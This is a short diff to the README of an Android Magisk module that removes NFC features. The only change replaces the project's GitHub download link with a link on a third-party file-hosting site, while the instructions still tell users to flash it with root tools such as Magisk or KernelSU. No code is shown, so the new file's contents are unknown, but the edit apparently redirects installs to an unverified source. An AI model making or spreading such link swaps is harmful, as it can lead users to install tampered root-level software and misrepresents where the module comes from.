@@ -15,7 +15,7 @@ v0.1
 - Initial release
 
 ## Installation Guide & Download Link
-- Install this module https://github.com/reiryuki/NFC-Features-Remover-Magisk-Module via Magisk app or Kitsune Mask app or KernelSU app or Apatch app or Recovery if Magisk or Kitsune Mask installed
+- Install this module https://devuploads.com/6beis8nq8hz7 via Magisk app or Kitsune Mask app or KernelSU app or Apatch app or Recovery if Magisk or Kitsune Mask installed
 - Reboot
 
 ## Support & Bug Report
